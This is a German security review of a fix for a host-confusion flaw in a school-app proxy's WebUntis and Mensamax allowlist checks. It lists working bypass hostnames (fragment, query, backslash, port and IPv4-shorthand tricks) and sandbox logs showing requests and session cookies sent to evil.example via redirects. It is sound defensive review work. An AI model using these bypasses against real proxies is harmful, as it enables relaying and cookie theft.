# Peer-Review „Der beste Freund“ — Sicherheitsfix Host-Verwechslung (v0.3.1)

**Prüfobjekt:** Commits `e17e36e` (Fix) und `707d887` (Release 0.3.1), samt der
Behauptungen in Commit-Nachricht, `OFFEN-naechste-Fixes.md`, `PROJEKT.md`
(Abschnitte 6 und 9, Release-Historie) und `proxy/README.md`.
**Prüfer:** unabhängige Runde ohne Vorwissen über die Fix-Sitzung, 09.10.2026.
**Zugriff:** Quellcode (Git, HEAD = `707d887`), Testsuite lokal, lokale
Cloudflare-Runtime `workerd 2026-09-26` (aus dem vorhandenen npx-Cache von
wrangler 4.144.0, ohne wrangler aufzurufen), Live-Website (GET) und Live-Proxy
(4 Anfragen, nur mit nicht auflösbaren `.invalid`-Zielen nach RFC 2606).
**Methode bei Laufzeitversuchen:** Worker in lokalem `workerd`, `globalOutbound`
auf einen Capture-Worker umgebogen. Jede ausgehende Anfrage wird protokolliert
und nie ins Netz geschickt. Experimente lagen nur im Scratchpad, im
Projektordner wurde außer dieser Datei nichts geändert.

---

## 1. Kurzeinschätzung

Du hast die Lücke sauber geschlossen. Ich habe den Angriff gegen den alten Code
in der echten Workers-Runtime nachgestellt: Der Worker hat `evil.example` und
`127.0.0.1` tatsächlich angefragt. Mit dem neuen Code und live auf dem Proxy
ist das weg. Deine Gegenprobe stimmt aufs Komma (11 rot), und die
Allowlist-statt-Denylist-Entscheidung ist genau die richtige. Was ich dir vor
dem Abhaken noch mitgeben würde: Die *Host*-Allowlist ist nicht dasselbe wie
eine *Ziel*-Allowlist. `fetch()` folgt Redirects, und bei Mensamax bestimmt der
Client Pfad und Port selbst mit. Außerdem fangen deine Tests zwei realistische
Regressionen nicht, darunter das komplette Entfernen der Mensamax-Prüfung im
Worker.

---

## 2. Verifikationstabelle

| Behauptung des Fixes | Ergebnis | Beleg |
|---|---|---|
| Alter Code ließ `evil.example#.webuntis.com`, `…?.webuntis.com`, `…\.webuntis.com`, `evil.example:443#.webuntis.com`, `127.0.0.1#.webuntis.com` durch, der Worker rief den Host vor dem Trennzeichen ab | ✅ | Alter `worker.js`/`hostcheck.mjs` (`git show e17e36e^:…`) in lokalem workerd, Capture-Log: `OUTBOUND POST https://evil.example/`, `OUTBOUND POST https://127.0.0.1/`, `OUTBOUND POST https://evil.example/.webuntis.com/WebUntis/jsonrpc.do`. Positivkontrolle `schule.webuntis.com` erscheint im selben Log, die Methode sieht also echte Abrufe. |
| „Offener Relay zu beliebigen Zielen“ | ✅ mit Präzisierung | Beliebiger Host und beliebiger Port (`evil.example:8443#…`), immer POST mit JSON-Body (`user`/`password`). Den Pfad bestimmt der Angreifer nur eingeschränkt: bei `#`/`?` ist es `/`, bei `\` ein Präfix aus dem Rest. Es ist also ein blinder POST-Relay, keiner, über den man Inhalte liest. |
| Positive Validierung nach RFC 1123 (a–z, 0–9, `.`, `-`, Labels 1–63, gesamt ≤ 253) vor der Endungsprüfung | ✅ | `proxy/hostcheck.mjs:75-78`, Aufruf `:86-89`. Formal kommt die Längenregel aus RFC 1035, RFC 1123 §2.1 lockert nur die Regel zur ersten Ziffer. Für die Praxis ist das egal. |
| „IDN nur in xn--Form“ | ⚠️ teilweise | Gilt nur bei Eingabe ohne Schema. Mit `https://` wandelt `extractHostnameFromUrl` (`hostcheck.mjs:58-64`) Unicode über `new URL()` in Punycode um, und die Eingabe wird akzeptiert. Für die Nutzer:innen ist das sogar besser. Dokumentiert ist es aber anders. |
| `httpsUrlForHost()` als zweite, unabhängige Sperre | ✅ wirksam, ⚠️ im Worker ungetestet | Mutant „Hostvergleich entfernt“ wird erkannt (`run-tests.mjs:474`). Die Sperre hat einen echten Anwendungsfall, den kein Test nennt (siehe D-1). Mutant „Worker verkettet wieder roh“ überlebt (siehe A-3). |
| Property-Tests je Angriffsklasse, Positivklasse, Invariante, Worker-Regressionstest ohne Netz | ✅ vorhanden, ⚠️ Klassenbeschreibung | Bei Leerraum und Prozent-Kodierung handelt es sich um Härtung, nicht um Angriffsklassen, siehe Korrektur K-1. |
| Gegenprobe: gegen den alten Code 11 Tests rot, alle Klassen außer Userinfo | ✅ exakt | Neue Tests, alter `hostcheck.mjs` (plus `httpsUrlForHost` angehängt, damit der Import auflöst) und alter Worker ergeben `132 Tests: 121 ✓ 11 ✗`. Rot sind Fragment, Query, Backslash, Port, Leerraum, Prozent, die Invariante, die Delimiter-, RFC-Label- und Non-ASCII-Beispiele sowie der Worker-Regressionstest. Userinfo bleibt grün. |
| Alte Prüfung + neuer Worker: Worker-Regressionstest grün, die Parser-Gegenprüfung allein blockt | ✅ | Gleiche Kombination mit neuem `worker.js`: `122 ✓ 10 ✗`, der Worker-Regressionstest ist nicht unter den roten. |
| Mensamax (`checkSafeHttpsUrl`) war nicht betroffen | ✅ | Der alte Code prüfte schon `url.hostname` des geparsten Objekts. Dass das Anhängen von `/login.aspx` den Host nicht ändert, habe ich auch in **workerd** gegengeprüft: 14 Grenzfälle (`\@`, `:443\@`, `#@`, `?@`, `https:\\`, U+3002, U+FF03, `%23`, Tab, führendes Leerzeichen, Port, Trailing Dot) liefern in Node `URL`, workerd `URL` und workerd `Request` identische Hosts. Ende-zu-Ende über den echten Worker ging z. B. `https://x.parentsmensa.de\@evil.example` als `GET https://x.parentsmensa.de/@evil.example/login.aspx` raus, also an den richtigen Host. |
| Mensamax-Property schlägt gegen einen Mutanten mit Endungsprüfung auf dem rohen String an | ✅ | Mutant `rawUrl.endsWith(suffix)` statt Hostprüfung: `126 ✓ 6 ✗`, darunter `for every accepted Mensamax base, the concatenated request URL has the checked host`. |
| Kopien unter `web/docs/` und `web/source/proxy/` byte-gleich | ✅ für HEAD, ⚠️ Arbeitsbaum | `git show HEAD:<orig>` und `HEAD:<kopie>` sind für alle 5 betroffenen Paare identisch. Im Arbeitsbaum ist `OFFEN-naechste-Fixes.md` uncommittet geändert (neuer Punkt 8), die Kopie nicht. Das gehört nicht zum Fix, aber `deploy.sh` würde in diesem Zustand abbrechen. |
| Version 0.3.1 in `package.json`, `ueber.html`, `PROJEKT.md` | ✅ | `707d887` |
| Website auf Stand HEAD | ✅ | `curl …/deploy-commit.txt` ergibt `707d8875…` = `git rev-parse HEAD`. `/ueber` zeigt `VERSION = '0.3.1'`. Live-`/source/proxy/hostcheck.mjs` und `worker.js` sowie `/docs/PROJEKT.md` und `OFFEN-naechste-Fixes.md` sind SHA-gleich zu HEAD. |
| Fix läuft produktiv auf dem Proxy | ✅ | Siehe Abschnitt „Live-Proxy“ unten |
| „Live erst nach `./deploy.sh`“ (OFFEN, Erledigt-Tabelle) | ❌ veraltet | Ist inzwischen live (siehe oben). Der Hinweis in `OFFEN-naechste-Fixes.md:46` sollte raus. |

**Live-Proxy (4 von erlaubten 20 Anfragen, alle Ziele `.invalid`):**

| Eingabe | Antwort live | Alter Code hätte … |
|---|---|---|
| `server: probe1.invalid` (Kontrolle) | `muss auf ".webuntis.com" enden` | dasselbe geliefert. Das belegt, dass der Fehlertext-Kanal funktioniert. |
| `probe2.invalid#.webuntis.com` | `Ungültiger Server-Hostname` | die Eingabe akzeptiert und `probe2.invalid` angefragt (lokal belegt: `ALT akzeptiert … -> fetch-Host probe2.invalid`) |
| `probe3.invalid\.webuntis.com` | `Ungültiger Server-Hostname` | `probe3.invalid` angefragt |
| `probe4.invalid:443?.webuntis.com` + Mensamax `https://probe4.invalid#.parentsmensa.de` | `Ungültiger Server-Hostname` / `muss auf ".parentsmensa.de" enden` | WebUntis: `probe4.invalid` angefragt. Mensamax: bei alt und neu gleich abgelehnt. |

Die Meldung „Ungültiger Server-Hostname“ konnte der alte Code für diese
Eingaben gar nicht erzeugen (er warf sie nur bei `@`, `/` oder leer). Die
Antworten belegen also den neuen Code. Ein Cache-Treffer scheidet aus, weil der
Cache-Schlüssel den Server-String enthält und alle Strings frisch waren.

---

## 3. Korrekturen (an den Behauptungen, nicht am Code)

**K-1: Leerraum und Prozent-Kodierung sind keine Angriffsklassen.**
`PROJEKT.md` Abschnitt 9 sagt: Jede Klasse „setzt einen fremden Host vor die
erlaubte Endung und muss immer abgelehnt werden“. Für diese beiden stimmt das
nicht. Der Generator für Leerraum (`run-tests.mjs:733`) fügt Leerraum in einen
*erlaubten* Host ein, nicht in einen fremden. Gegen den alten Code ging
außerdem keine dieser Eingaben an einen fremden Host:

```
ALT akzeptiert "evil.example%23.webuntis.com" -> fetch-Host: URL-Fehler (fail closed)
ALT akzeptiert "evil.example%40.webuntis.com" -> fetch-Host: URL-Fehler (fail closed)
ALT akzeptiert "a b.webuntis.com"             -> fetch-Host: URL-Fehler (fail closed)
ALT akzeptiert "a\t.webuntis.com"             -> fetch-Host: a.webuntis.com
```

Die Tests sind als Härtung richtig: Sie lehnen früher ab, mit klarer Meldung.
Die Doku sollte sie aber als „Härtung, war nicht ausnutzbar“ führen. Sonst
wirkt die Lücke größer, als sie war, und eine spätere Leserin sucht in diesen
Klassen nach einem Exploit, den es nie gab. Ähnlich ist die Gegenprobe zu
lesen: Die „11 roten Tests“ zählen auch Tests mit, die nur die strengere Syntax
fordern. Die ausnutzbaren Klassen sind Fragment, Query, Backslash und Port.

**K-2: Der Kommentar in `hostcheck.mjs:69-71` verspricht zu viel.**
Dort steht, `https://<host>/…` parse „always“ zurück auf genau `<host>`. Bei
IPv4-Kurzformen stimmt das nicht. Sie bestehen die Syntaxprüfung, und der
WHATWG-Parser schreibt sie um:

```
"127.1"      -> checkSafeHostname ok: 127.1      | Parser: 127.0.0.1 | httpsUrlForHost wirft
"0x7f000001" -> checkSafeHostname ok: 0x7f000001 | Parser: 127.0.0.1 | httpsUrlForHost wirft
"0177.0.0.1" -> checkSafeHostname ok: 0177.0.0.1 | Parser: 127.0.0.1 | httpsUrlForHost wirft
```

Mit Suffix (`.webuntis.com`/`.parentsmensa.de`) ist das unerreichbar: Das
letzte Label ist nicht numerisch, also behandelt der Parser den Host nicht als
IPv4. Im Produktivpfad passiert daher nichts. Der Kommentar sollte die
Einschränkung aber nennen. Das ist zugleich das beste Argument für
`httpsUrlForHost()` (siehe D-1).

**K-3:** „IDN nur in xn--Form“ beschreibt nur die Eingabe ohne Schema, siehe
Tabelle. Der Satz in der Commit-Nachricht und im Kommentar `hostcheck.mjs:74`
sollte ergänzt werden.

---

## 4. Zusatzbefunde

### A — Security in der Tiefe

**🟡 A-1: `fetch()` folgt Redirects. Die Host-Allowlist ist damit keine Ziel-Allowlist, und bei Mensamax leitet der Proxy dabei die Session-Cookies weiter.**
`worker.js:276` (Login-GET) und `worker.js:351-354` (PlanForm-GET mit
`Cookie`-Header) laufen mit dem Standard `redirect: 'follow'`. Nur der
Login-POST (`:294`) nutzt `manual`. Lokal in workerd nachgestellt, mit einem
Capture-Worker, der für ein erlaubtes `*.parentsmensa.de` ein 302 nach
`https://evil.example/landed` liefert:

```
OUTBOUND GET https://x.parentsmensa.de/p?/mensamax/Essenbestellung/bestellen-stornieren/PlanForm.aspx cookie=MensaMax=SESSIONSECRET; ASP.NET_SessionId=abc
OUTBOUND GET https://evil.example/landed cookie=MensaMax=SESSIONSECRET; ASP.NET_SessionId=abc
```

Der Worker verlässt also die Allowlist und nimmt den von Hand gesetzten
`Cookie`-Header mit. Ausnutzbar ist das dadurch, dass `base` bei Mensamax Pfad,
Query, Fragment und Port enthalten darf (siehe A-2). Ein Angreifer kann damit
jeden Pfad auf `*.parentsmensa.de` ansteuern, und `/login.aspx` landet per
`?` im Query. Daraus folgt: **Jede offene Weiterleitung auf irgendeinem
`*.parentsmensa.de`-Pfad macht den Proxy wieder zum (blinden GET-)Relay an
beliebige Hosts.** Ob es dort eine offene Weiterleitung gibt, ist [ungeprüft].
Absichtlich, denn das hätte Anfragen an einen fremden Dienst bedeutet.

Bei WebUntis ist der Pfad fest (`/WebUntis/jsonrpc.do`). Dort bräuchte es einen
Redirect genau an diesem Endpunkt eines `*.webuntis.com`-Hosts. Bei 307/308
ginge der POST-Body mit Benutzername und Passwort mit. Das Risiko ist gering,
aber derselbe Fix schließt es mit.

Empfehlung: `redirect: 'manual'` an allen Abrufen. Wenn Mensamax beim
Login-GET legitim weiterleitet [ungeprüft], dann die Weiterleitung von Hand
folgen und das `Location`-Ziel durch denselben `checkSafeHttpsUrl` schicken.

**🟡 A-2: Mensamax-Anfragen werden aus dem rohen `base`-String gebaut, nicht aus der geprüften URL.**
`checkSafeHttpsUrl()` gibt das geparste `URL`-Objekt zurück (`hostcheck.mjs:137`).
`worker.js:346` verwirft es aber, und `:276/:290/:352` verketten `${base}/…`.
Den Host kann das nicht ändern, das habe ich in Node und workerd belegt (siehe
Tabelle), deshalb kein 🔴. Aber Port und Pfad sind frei wählbar. Live in
workerd gesehen: `GET https://x.parentsmensa.de:8443/login.aspx`, und bei
`base = https://x.parentsmensa.de#@evil.example` schluckt das Fragment den
Pfad, sodass `GET https://x.parentsmensa.de/` rausgeht. Bei WebUntis hast du
genau dieses Muster jetzt richtig gelöst: aus dem geprüften Host neu bauen,
fester Pfad. Mensamax sollte nachziehen: `checked.origin` plus fester Pfad,
Nicht-Standard-Port und Pfad/Query/Fragment in `base` ablehnen. Nebeneffekt:
`https://parentsmensa.de/` mit Slash am Ende ergäbe dann nicht mehr
`//login.aspx`. Ob Cloudflare Workers ausgehend Nicht-Standard-Ports zulässt,
ist [ungeprüft]. Lokal in workerd ging die Anfrage raus.

**🟡 A-3: Zwei realistische Regressionen bleiben grün (Mutationstest, 18 Mutanten, siehe D-2).**
- *Worker ruft `checkSafeHttpsUrl` für Mensamax gar nicht mehr auf* (Zeile
  `worker.js:346` gelöscht): `132 ✓ 0 ✗`. Damit wäre der Proxy über `base`
  wieder ein offener Relay, und kein Test merkt es. Die neue Mensamax-Property
  prüft nur die Funktion isoliert, nicht dass der Worker sie benutzt. Es fehlt
  das Mensamax-Gegenstück zu deinem WebUntis-Worker-Regressionstest
  (`run-tests.mjs:1002`): eine fremde `base` darf nie `fetch()` erreichen.
- *Endungsprüfung ohne Label-Grenze* (`h.endsWith(bare)` statt
  `h === bare || h.endsWith('.' + bare)`): `132 ✓ 0 ✗`. Damit ginge
  `evilwebuntis.com` bzw. `notparentsmensa.de` durch, also eine Domain, die
  sich jeder registrieren kann. Das ist der klassische Fehler bei
  Endungsprüfungen. Es fehlt die Äquivalenzklasse „endet als String auf die
  Domain, aber ohne Punkt davor“ als Negativklasse. Die vorhandene
  Negativklasse (`run-tests.mjs`, „random domain outside the allowlist“)
  erzeugt nur `*.example`.

Der heutige Code ist in beiden Punkten korrekt. Das sind Lücken im Testnetz,
keine Lücken im Proxy.

**🟢 A-4: `isPrivateOrLocalTarget()` kennt nur die Vier-Oktett-Dezimalform.**
`127.1`, `0x7f000001` und `0177.0.0.1` gelten als „nicht privat“. Umgekehrt
wird `010.0.0.1` fälschlich als 10/8 erkannt, der Parser liest es oktal als
`8.0.0.1`. Im Produktivpfad ist das unerreichbar: Mit Suffix gibt es keine
IP-Literale, und `checkSafeHttpsUrl` prüft den bereits normalisierten
`url.hostname`. Es wird erst relevant, wenn jemand `checkSafeHostname` einmal
ohne Suffix einsetzt. Dann fängt es aktuell `httpsUrlForHost()` ab. Ein Satz im
Kommentar reicht.

**Threat-Model-Einordnung:** 🔴 für die ursprüngliche Lücke war richtig.
Ein unauthentifizierter Endpunkt, der an jeden Host POSTet, ist genau das, was
man bei Missbrauch nicht unter der eigenen Cloudflare-IP haben will. Den Hinweis
im Sicherheitsmodell, dass es keine klassische Metadata-SSRF-Fläche gibt,
teile ich [Workers-Interna ungeprüft]. Der eigentliche Schaden war die
Reputation der Absender-IP, nicht interne Daten.

### B — CCC-Perspektive
Der Fix berührt nichts davon. Positiv: Der Fix kommt ohne neue Abhängigkeit
aus. Die Property-Tests nutzen den hauseigenen `mulberry32`.

### C — Alltagsblick

**🟢 C-1: Kollateralschäden der strengeren Prüfung sind praktisch null.**
Neu abgelehnt wird gegenüber vorher nur, was die alte Prüfung akzeptierte *und*
was beim Abruf auch funktioniert hätte: Unicode-IDN ohne Schema, Unterstrich,
Bindestrich am Label-Rand, Labels über 63 Zeichen, Tab mitten im Namen. Nichts
davon ist für einen WebUntis-Server realistisch. Unterstrich-Hosts bekommen
ohnehin keine öffentlichen TLS-Zertifikate [ungeprüft, CA/B-Forum-Regel aus
dem Gedächtnis]. Großschreibung, Leerraum am Rand, eine kopierte komplette URL
und der Mensamax-Default `https://parentsmensa.de` funktionieren weiter
(Positivklasse plus Bestandstests grün). Die echten gespeicherten
Konfigurationen der Familien liegen im `localStorage` auf deren Geräten und
sind für mich nicht einsehbar [ungeprüft]. Kleiner UX-Hinweis: Bei IDN kommt
nur „Ungültiger Server-Hostname“, ohne Hinweis auf die xn--Form.

**🟢 C-2 (außerhalb des Fixes, bei der Gelegenheit gefunden): Ein WebUntis-Ausfall wird als „Passwort falsch“ gemeldet.**
`worker.js:165` wirft bei einer Antwort ohne JSON (z. B. HTML-Wartungsseite
mit 503) `WebUntis authenticate: keine gültige JSON-Antwort …`. `:188`
erkennt am Präfix `WebUntis authenticate:` aber „Login abgelehnt“ und
übersetzt das in „Benutzername oder Passwort prüfen“. Lokal reproduziert: Der
Capture-Worker liefert HTML, die Antwort lautet `WebUntis-Login fehlgeschlagen
— Benutzername oder Passwort prüfen.` Eltern ändern dann womöglich ein
Passwort, das gar nicht falsch war.

### D — Nerd-Detailblick

**🟢 D-1: `httpsUrlForHost()` ist gut, aber ihr Testbeispiel ist schwach gewählt.**
`run-tests.mjs:474` prüft die zweite Sperre mit `evil.example#.webuntis.com`,
einer Eingabe, die die erste Sperre schon abweist. Der Test zeigt also nur,
dass die Funktion allein wirft, nicht wofür man sie braucht. `127.1` oder
`0x7f000001` bestehen die Syntaxprüfung, und erst `httpsUrlForHost` hält sie
auf (K-2). Ein solcher Fall als benanntes Beispiel würde zeigen, wofür die
zweite Sperre da ist. Dazu passt: Der Mutant „Worker verkettet wieder roh statt
`httpsUrlForHost`“ überlebt. Das ist hinnehmbar, weil die erste Sperre davor
steht. Dann sollte die Doku aber nicht so klingen, als sei die zweite Sperre
abgesichert.

**🟢 D-2: Mutationsbilanz der neuen Tests.** 18 Mutanten, jeweils auf einer
Kopie im Scratchpad:

| Mutant | Ergebnis |
|---|---|
| Label erlaubt `#` / `\` / `%` | getötet (die jeweilige Klasse + Invariante) |
| End-Anker im Label-Regex entfernt | getötet (12 rot) |
| `every` → `some` | getötet (13 rot) |
| Syntaxprüfung → alte `@`/`/`-Sperre | getötet (10 rot) |
| Denylist statt Allowlist (`[^#?/\\@:%\s]+`) | getötet (RFC-Label- und Non-ASCII-Test) |
| `httpsUrlForHost` ohne Hostvergleich | getötet |
| Private-Target-Prüfung entfernt | getötet (Bestandstests) |
| `toLowerCase` entfernt | getötet (Bestandstest) |
| Mensamax: Endungsprüfung auf rohem String | getötet (bestätigt deine Behauptung) |
| Label erlaubt `:` / `_` | überlebt, harmlos (`:` scheitert geschlossen in `httpsUrlForHost`, `_` erreicht weiter nur `*.webuntis.com`) |
| Gesamtlänge ≤ 253 entfernt | überlebt, harmlos |
| Worker verkettet roh statt `httpsUrlForHost` | überlebt, siehe D-1 |
| Worker ignoriert Prüfergebnis, nutzt rohen `server` | überlebt. Ich habe keine akzeptierte Eingabe gefunden, die dadurch an einen fremden Host geht (`https://https://…` ergibt Host `https`), trotzdem unschön. |
| **Worker ruft Mensamax-Prüfung nicht auf** | **überlebt, 🟡 A-3** |
| **Endung ohne Label-Grenze** | **überlebt, 🟡 A-3** |

Fazit dazu: Die neuen Property-Tests prüfen die eigentliche Eigenschaft
(„akzeptiert ⇒ parst auf genau diesen erlaubten Host“), nicht die
Implementierung. Die Denylist-Variante wird z. B. erkannt, obwohl sie alle
Angriffsklassen besteht. Die Lücken liegen an den Rändern: Worker-Verdrahtung
und Suffix-Grenze.

**🟢 D-3: Fester Seed.** Jedes `forAll` startet mit `20260901` und 200 Fällen
(`run-tests.mjs:567-581`), also prüft jeder Lauf exakt dieselben Eingaben, für
die sieben Verwechslungsklassen zusammen 1 400. Für Reproduzierbarkeit ist das so gewollt
und dokumentiert. Ein optionaler Seed per Umgebungsvariable (Standard bleibt
fest, ein Fehlschlag druckt den Seed schon heute) würde gelegentliche
Erkundungsläufe erlauben, ohne die CI unruhig zu machen.

**🟢 D-4: Node gegen workerd.** Die Sorge, dass die Testsuite (Node) und die
Produktion (workerd) URLs unterschiedlich parsen, ist für den geprüften
Ausschnitt unbegründet. 28 Grenzfall-URLs ergaben in Node 24 `URL`,
workerd `URL` und workerd `new Request().url` identische Hosts. Grund ist
`compatibility_date = "2026-08-25"` (`proxy/wrangler.toml:3`). Mit einem sehr
alten Kompatibilitätsdatum sähe das anders aus [ungeprüft, Flag-Namen nicht
nachgeschlagen]. Das Datum lohnt also einen Kommentar „nicht zurückdrehen“.

**🟢 D-5: Doku-Kleinkram.**
- `OFFEN-naechste-Fixes.md:46`: „**Live erst nach `./deploy.sh`**“ ist erledigt.
- `proxy/README.md`, SSRF-Abschnitt: „`server` muss ein gültiger Hostname …
  sein“. Dass auch eine komplette URL angenommen und der Host herausgelöst
  wird, fehlt dort.
- Arbeitsbaum: uncommitteter Punkt 8 in `OFFEN-naechste-Fixes.md` ohne
  Spiegelung nach `web/docs/`. Das gehört nicht zum Fix, blockiert aber den
  nächsten `deploy.sh`. Passend dazu steht in diesem Punkt 8 selbst schon der
  Befund, dass der Live-Check bei unsauberem Baum fälschlich grün meldet. Für
  diesen Deploy ist das unkritisch: Die Live-Dateien sind SHA-gleich zu HEAD.
- `npx eslint .` ist sauber, und der Test „No journal comments“ ist grün.

---

## 5. Gewichtungs-Feedback

- **🔴 für die ursprüngliche Lücke:** volle Zustimmung, siehe Threat Model.
- **„Mensamax nicht betroffen“:** Zustimmung für die Host-Verwechslung, auch in
  der echten Runtime belegt. Als Gesamturteil zu Mensamax ist der Satz aber zu
  beruhigend. Über Pfadfreiheit plus Redirect-Folgen (A-1/A-2) besteht dort
  eine eigene, wenn auch bedingte Relay-Möglichkeit. Ich würde sie als 🟡 in
  „Noch offen“ aufnehmen, nicht als 🔴. Sie hängt an einer offenen
  Weiterleitung beim Anbieter, die nicht belegt ist.
- **Testkonzept:** Dass du die Gegenprobe gegen alten Code *und* gegen „alte
  Prüfung + neuer Worker“ gefahren hast, ist vorbildlich. Genau so belegt man
  eine zweite Sperre. Zu großzügig warst du nur bei der Zahl der
  „Angriffsklassen“ (K-1).

---

## 6. Fazit

**Zum Fix:** Er schließt die gemeldete Lücke vollständig. Ich habe gegen
WebUntis keine Eingabe gefunden, die nach dem Fix einen anderen Host als
`*.webuntis.com` erreicht. Die Prüfung ist eine echte Allowlist, sie läuft
live, und sie wird durch eine zweite, unabhängige Sperre abgesichert. Die
verbleibende Angriffsfläche liegt neben dem Fix: Redirect-Folgen und die
roh verkettete Mensamax-`base`. Dazu kommen zwei Testlücken (Worker-Verdrahtung
Mensamax, Suffix ohne Label-Grenze), die eine künftige Regression unbemerkt
durchließen.

**Zur Arbeit selbst:** hohe Belegdichte, ehrliche Gegenprobe, saubere
Doku-Spiegelung. Die Behauptungen, die ich nachgerechnet habe, stimmen bis auf
die Einordnung von Leerraum und Prozent-Kodierung als Angriffsklassen und zwei
überzogene Kommentarsätze. Für eine Sitzung, die ihren eigenen Fix bewertet,
ist das wenig Betriebsblindheit.

**Empfohlene nächste Schritte (nach Aufwand sortiert):** Worker-Regressionstest
„fremde Mensamax-`base` erreicht nie `fetch()`“; Negativklasse „Suffix ohne
Punkt“; `redirect: 'manual'` an allen drei Mensamax-/WebUntis-Abrufen;
Mensamax-URLs aus `checked.origin` bauen und Port/Pfad in `base` ablehnen;
Doku-Korrekturen K-1 bis K-3 und D-5.
